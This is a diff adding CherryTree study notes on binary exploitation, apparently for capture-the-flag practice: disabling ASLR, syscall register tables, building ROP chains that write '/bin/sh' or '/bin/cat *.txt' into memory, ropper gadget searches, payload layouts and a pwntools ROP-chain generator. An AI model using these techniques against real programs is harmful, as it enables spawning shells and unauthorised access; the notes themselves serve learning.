@@ -1,0 +1,277 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Binary-Exploits" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="1" foreground="#e5e5e5" ts_creation="1603815515" ts_lastsave="1603898103">
+    <rich_text underline="single" style="italic" weight="heavy">To Disable Address Space Layout Randomization</rich_text>
+    <rich_text>
+
+echo "0" &gt;  /proc/sys/kernel/randomize_va_space
+
+</rich_text>
+    <rich_text underline="single" style="italic" weight="heavy">The Stack Difference Between 32 and 64 bit binary</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">x86_32</rich_text>
+    <rich_text>
+
++------------+----------+----------+---------+---------+--------+---------+
+ | syscall |  arg0 |  arg1 | arg2 | arg3 | arg4 | arg5 |
++------------+----------+----------+---------+---------+--------+---------+
+ |  %eax   | %ebx | %ecx | %edx | %esi | %edi | %ebp |
++------------+----------+----------+---------+----------+-------+---------+
+
+</rich_text>
+    <rich_text underline="single" style="italic">The 32bit version payload would be…</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text style="italic">The way to exploit a 32bit binary is like reading a letter from a friend that's sent through post</rich_text>
+    <rich_text> :
+• First you will see a </rich_text>
+    <rich_text weight="heavy">from</rich_text>
+    <rich_text> address i.e the address from where the letter started it's journey (system_address)
+• Second you will see a </rich_text>
+    <rich_text weight="heavy">to</rich_text>
+    <rich_text> address i.e the address to where the letter ends its journey (return address)
+• Finally you will be able to see the contents of the letter i.e which is the </rich_text>
+    <rich_text weight="heavy">context</rich_text>
+    <rich_text> of the letter (arguments for the system_address)
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text weight="heavy">x86_64</rich_text>
+    <rich_text>
+
++------------+----------+----------+---------+---------+--------+---------+
+ | syscall |  arg0 |  arg1 | arg2 | arg3 | arg4 | arg5  |
++------------+----------+----------+---------+---------+--------+---------+
+ |   %rax  | %rdi  |  %rsi  | %rdx | %r10 |  %r8  | %r9  |
++------------+----------+----------+---------+---------+--------+---------+
+
+</rich_text>
+    <rich_text underline="single" style="italic">The 64bit version payload would be…</rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text style="italic">The way to exploit a 64bit binary is like reading a letter</rich_text>
+    <rich_text> which is empty on the outside:
+• First ,you have to </rich_text>
+    <rich_text weight="heavy">open</rich_text>
+    <rich_text> the letter without damaging it to know what is inside (rop gadgets)
+• Second, you will be able to see the contents of the letter i.e the </rich_text>
+    <rich_text weight="heavy">context</rich_text>
+    <rich_text> of the letter (arguments for the system_address)
+• Finally after reading the letter you will be able to know who wrote the letter i.e the </rich_text>
+    <rich_text weight="heavy">from</rich_text>
+    <rich_text> address (system_address)
+
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+</rich_text>
+    <rich_text underline="single" style="italic" weight="heavy">Writing in the Stack and executing  ROP (Return Oriented Programming) to pwn a binary</rich_text>
+    <rich_text>
+
+◇ Find a place to write by checking for Writeable and Allocatable (</rich_text>
+    <rich_text weight="heavy">WA</rich_text>
+    <rich_text>) memory with enough space! </rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text> </rich_text>
+    <rich_text weight="heavy">[mem_address]</rich_text>
+    <rich_text>
+◇ Search for the appropriate </rich_text>
+    <rich_text weight="heavy">mov</rich_text>
+    <rich_text> gadget to inject the string into the stack by </rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text weight="heavy">[mov_address]</rich_text>
+    <rich_text>
+◇ Search for the appropriate </rich_text>
+    <rich_text weight="heavy">pop</rich_text>
+    <rich_text> gadget to inject the string into the stack by </rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text> </rich_text>
+    <rich_text weight="heavy">[pop_address]</rich_text>
+    <rich_text>
+
+• </rich_text>
+    <rich_text style="italic">Writing into the Stack</rich_text>
+    <rich_text> in a </rich_text>
+    <rich_text style="italic" weight="heavy">3</rich_text>
+    <rich_text weight="heavy">2bit</rich_text>
+    <rich_text> binary
+
+◇ For example if we are going to write the string </rich_text>
+    <rich_text weight="heavy">“/bin/sh”</rich_text>
+    <rich_text> into the stack. Given that we can only write 4 words at a time into the stack or else we may overwrite the other registers in the process.
+ 
+   ▪ Writing “/bin” in the stack 
+      → </rich_text>
+    <rich_text weight="heavy">pop_address</rich_text>
+    <rich_text> to clear the registers and then move to the </rich_text>
+    <rich_text weight="heavy">mem_address</rich_text>
+    <rich_text> and then write/overwrite it with </rich_text>
+    <rich_text weight="heavy">“/bin”</rich_text>
+    <rich_text> and then move back to </rich_text>
+    <rich_text weight="heavy">EIP</rich_text>
+    <rich_text> using </rich_text>
+    <rich_text weight="heavy">mov_address</rich_text>
+    <rich_text> , so that we can write the next part of string inside the memory
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+   ▪ Writing “//sh” or “/sh/x00”
+      → </rich_text>
+    <rich_text weight="heavy">pop_address</rich_text>
+    <rich_text> to clear the registers and then move to the (</rich_text>
+    <rich_text weight="heavy">mem_address+4</rich_text>
+    <rich_text>)[The plus 4 is because the first 4 elements of the memory is already filled by </rich_text>
+    <rich_text weight="heavy">rop1</rich_text>
+    <rich_text> ] and then write/overwrite it with </rich_text>
+    <rich_text weight="heavy">“/sh”</rich_text>
+    <rich_text> and then move back to </rich_text>
+    <rich_text weight="heavy">EIP</rich_text>
+    <rich_text> using </rich_text>
+    <rich_text weight="heavy">mov_address</rich_text>
+    <rich_text> , so that we can do a </rich_text>
+    <rich_text weight="heavy">sys_call</rich_text>
+    <rich_text> and call </rich_text>
+    <rich_text weight="heavy">“/bin/sh”</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+◇ Writing the Final Payload after writing “/bin/sh” into the stack
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+We can also use print function and flag_name.txt as argument to cat the flag... rather than getting a shell. If a print function is given!
+
+• </rich_text>
+    <rich_text style="italic">Writing into the Stack in a </rich_text>
+    <rich_text style="italic" weight="heavy">64bit</rich_text>
+    <rich_text style="italic"> binary</rich_text>
+    <rich_text>
+
+◇ I didnt wanna take the same example here as </rich_text>
+    <rich_text weight="heavy">“/bin/sh”</rich_text>
+    <rich_text> because it takes only 8bytes so we can complete the rop in a single line given that in 64bit we can write 8 words at a time into the stack as a threshold so to make it more interesting , i am writing the string </rich_text>
+    <rich_text weight="heavy">“/bin/cat *.txt”</rich_text>
+    <rich_text> into the stack.
+ 
+   ▪ Writing “/bin/cat” in the stack 
+      → </rich_text>
+    <rich_text weight="heavy">pop_address</rich_text>
+    <rich_text> to clear the registers and then move to the </rich_text>
+    <rich_text weight="heavy">mem_address</rich_text>
+    <rich_text> and then write/overwrite it with </rich_text>
+    <rich_text weight="heavy">“/bin”</rich_text>
+    <rich_text> and then move back to </rich_text>
+    <rich_text weight="heavy">RIP</rich_text>
+    <rich_text> using </rich_text>
+    <rich_text weight="heavy">mov_address</rich_text>
+    <rich_text> , so that we can write the next part of string inside the memory
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+   ▪ Writing “ *.txt” [Adding a space in the front as only “</rich_text>
+    <rich_text weight="heavy">/bin/cat *.txt</rich_text>
+    <rich_text>” works and “</rich_text>
+    <rich_text weight="heavy">/bin/cat*.txt</rich_text>
+    <rich_text>" doesnt]
+      → </rich_text>
+    <rich_text weight="heavy">pop_address</rich_text>
+    <rich_text> to clear the registers and then move to the (</rich_text>
+    <rich_text weight="heavy">mem_address+</rich_text>
+    <rich_text>8)[The plus 8 is because the first 8 elements of the memory is already filled by </rich_text>
+    <rich_text weight="heavy">rop1</rich_text>
+    <rich_text> ] and then write/overwrite it with </rich_text>
+    <rich_text weight="heavy">“ *.txt\x00\x00”</rich_text>
+    <rich_text> and then move back to </rich_text>
+    <rich_text weight="heavy">RIP</rich_text>
+    <rich_text> using </rich_text>
+    <rich_text weight="heavy">mov_address</rich_text>
+    <rich_text> , so that we can do a </rich_text>
+    <rich_text weight="heavy">sys_call</rich_text>
+    <rich_text> and call </rich_text>
+    <rich_text weight="heavy">“/bin/cat *.txt”</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+◇ Writing the Final Payload after writing “/bin/cat *.txt” into the stack
+   ▪ As it is a 64bit binary we need a </rich_text>
+    <rich_text weight="heavy">pop_rdi</rich_text>
+    <rich_text> gadget to pop </rich_text>
+    <rich_text weight="heavy">RDI</rich_text>
+    <rich_text> and create a fake stack to control the flow of execution, which can be selected from here </rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text weight="heavy">[pop_rdi]</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+But I am Too Lazy to make a ROP chain and then append it with the PAYLOAD.....,So i made something to create the ropchain,not the finest program,But it WORKS!!! XD
+
+
+
+
+
+
+
+
+
+
+
+
+</rich_text>
+    <codebox char_offset="986" justification="left" frame_width="625" frame_height="30" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">PAYLOAD = offset_padding + system_addr + "4_byte_junk" + print_flag</codebox>
+    <codebox char_offset="1810" justification="left" frame_width="670" frame_height="30" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">PAYLOAD =  offset_padding + pop_rdi_gadget + print_flag + system_address</codebox>
+    <codebox char_offset="1997" justification="left" frame_width="175" frame_height="30" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">readelf -S binary</codebox>
+    <codebox char_offset="2092" justification="left" frame_width="340" frame_height="30" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ropper --file binary --search "mov"</codebox>
+    <codebox char_offset="2186" justification="left" frame_width="340" frame_height="30" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ropper --file binary --search "pop"</codebox>
+    <codebox char_offset="2707" justification="left" frame_width="520" frame_height="30" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">rop1 = pop_address + mem_address + “/bin” + mov_address</codebox>
+    <codebox char_offset="3041" justification="left" frame_width="580" frame_height="30" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">rop2 = pop_address + (mem_address+4) + “/sh\x00” + mov_address</codebox>
+    <codebox char_offset="3111" justification="left" frame_width="790" frame_height="30" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">PAYLOAD = offset_padding + rop1 + rop2 + system_address + *4_byte_junk* + mem_address</codebox>
+    <codebox char_offset="3862" justification="left" frame_width="550" frame_height="30" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">rop1 = pop_address + mem_address + “/bin/cat” + mov_address</codebox>
+    <codebox char_offset="4291" justification="left" frame_width="640" frame_height="30" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">rop2 = pop_address + (mem_address+8) + “ *.txt\x00\x00” + mov_address</codebox>
+    <codebox char_offset="4523" justification="left" frame_width="370" frame_height="30" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ropper --file binary --search "pop rdi"</codebox>
+    <codebox char_offset="4534" justification="left" frame_width="715" frame_height="30" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">PAYLOAD = offset_padding + rop1 + rop2 + pop_rdi + mem_address + sys_address</codebox>
+    <codebox char_offset="4701" justification="left" frame_width="865" frame_height="420" width_in_pixels="1" syntax_highlighting="python" highlight_brackets="1" show_line_numbers="0">from pwn import * #[pip2 install pwntools] because, I personally feel python2 is great for pwning binary
+
+def ropper(mem_addr,pop_addr,mov_addr,sys_addr,string,arch = 32):
+# Functionable for both 32 and 64 bit
+#IMPORTANT : CHOOSE THE correct address for the rop chain to work
+# Format of pop_addr,mov_addr and sys_addr - only packed as 32bit
+# Format of mem_addr - as int or hex_int
+# Format of string - only str
+# Format of Arch - only int
+	i = 0
+	rop = ""
+	if arch == 64:
+		s = [string[j:j+8] for j in range(0,len(string),8)]
+		for a in s:
+			if len(a) % 8 != 0:
+				a += "\x00"*(8 - len(a))
+			rop += pop_addr + p64(mem_addr+i) + a + mov_addr
+			i += 8
+	else:
+		s = [string[j:j+4] for j in range(0,len(string),4)]
+		for a in s:
+			if len(a) % 4 != 0:
+				a += "\x00"*(4 - len(a))
+			rop += pop_addr + p32(mem_addr+i) + a + mov_addr
+			i += 4
+	return rop
+</codebox>
+  </node>
+</cherrytree>
